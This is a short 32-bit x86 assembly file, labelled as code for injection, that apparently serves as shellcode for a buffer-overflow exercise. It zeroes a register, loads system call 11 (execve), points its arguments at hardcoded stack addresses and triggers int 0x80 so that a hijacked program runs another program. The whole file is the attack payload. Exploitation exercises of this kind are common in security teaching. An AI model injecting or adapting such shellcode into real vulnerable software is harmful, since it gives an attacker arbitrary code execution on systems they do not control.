# generate assembly code for injection

.section .text
.globl main

main:
	xorl %eax, %eax
	movb $0xb, %al
	movl $0xbffffe60, %ebx
	movl $0xbffffe78, %ecx
	movl $0xbffffe80, %edx
	int  $0x80
